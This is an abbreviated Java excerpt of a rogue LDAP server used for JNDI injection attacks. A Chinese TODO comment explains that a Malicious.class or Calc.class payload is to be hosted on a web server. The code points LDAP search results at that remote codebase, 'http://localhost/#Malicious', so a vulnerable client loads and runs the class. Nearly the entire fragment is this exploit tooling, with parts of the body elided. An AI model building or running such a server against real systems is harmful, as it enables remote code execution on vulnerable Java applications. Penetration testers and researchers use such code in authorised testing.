...
public class LdapServer {
    ...
    public LdapServer run() {
        int port = 43658;
        //TODO 把resources下的Malicious.class 或者 自定义修改编译后target目录下的Calc.class 拷贝到下面代码所示http://host:port的web服务器根目录即可
        String url = "http://localhost/#Malicious";
        try {
    ...
    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        ...
        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e)
            ...
            e.addAttribute("javaClassName", "Malicious");
